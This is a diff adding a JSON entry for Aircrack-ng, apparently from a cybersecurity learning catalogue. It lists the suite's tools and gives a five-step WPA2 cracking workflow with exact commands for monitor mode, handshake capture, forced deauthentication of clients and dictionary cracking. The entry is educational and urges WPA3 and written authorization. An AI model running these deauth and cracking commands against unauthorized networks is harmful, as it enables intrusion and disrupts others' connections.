@@ -1,0 +1,37 @@
+{
+  "id": "aircrack-ng",
+  "title": "Aircrack-ng",
+  "shortName": "Aircrack-ng",
+  "type": "tool",
+  "category": "wireless_security",
+  "description": "Complete suite for WiFi network security assessment — capture, crack, and analyze wireless traffic.",
+  "fullExplanation": "Aircrack-ng is a complete suite of tools for assessing WiFi network security. It covers monitoring (packet capture), attacking (deauthentication, fake AP), testing (WEP/WPA cracking), and cracking (dictionary and brute force). The suite includes airmon-ng (monitor mode), airodump-ng (capture), aireplay-ng (injection), and aircrack-ng (cracking).",
+  "tools": [
+    { "name": "airmon-ng", "description": "Enable/disable monitor mode on wireless interface" },
+    { "name": "airodump-ng", "description": "Capture 802.11 frames — discover networks, capture WPA handshakes" },
+    { "name": "aireplay-ng", "description": "Packet injection — deauth clients, fake authentication, ARP replay" },
+    { "name": "aircrack-ng", "description": "Crack WEP keys and WPA/WPA2 PSK from captured handshakes" },
+    { "name": "airbase-ng", "description": "Create fake access points (evil twin)" },
+    { "name": "airdecap-ng", "description": "Decrypt WEP/WPA captured packets" }
+  ],
+  "wpa2CrackWorkflow": [
+    { "step": 1, "command": "airmon-ng start wlan0", "description": "Enable monitor mode → creates wlan0mon" },
+    { "step": 2, "command": "airodump-ng wlan0mon", "description": "Discover nearby networks — note BSSID and channel" },
+    { "step": 3, "command": "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", "description": "Capture on target network" },
+    { "step": 4, "command": "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon", "description": "Deauth clients to force handshake" },
+    { "step": 5, "command": "aircrack-ng -w rockyou.txt capture-01.cap", "description": "Crack captured WPA2 handshake" }
+  ],
+  "keyFacts": [
+    "WEP cracked in minutes — never use WEP",
+    "WPA2-PSK: capture 4-way handshake, then offline dictionary attack",
+    "PMKID attack: crack WPA2 without capturing handshake (hcxdumptool + hashcat)",
+    "WPA3-SAE: resistant to offline dictionary attacks — use WPA3",
+    "Monitor mode requires compatible wireless card (Alfa AWUS036ACH popular)",
+    "Deauth attack: send forged deauthentication frames to disconnect clients",
+    "Always get written authorization before testing wireless networks"
+  ],
+  "children": [],
+  "parent": "tools",
+  "relatedConcepts": ["wifi-security", "brute-force", "mitm", "evil-twin"],
+  "visualization": { "color": "#ffcc00", "icon": "📶", "nodeType": "leaf" }
+}
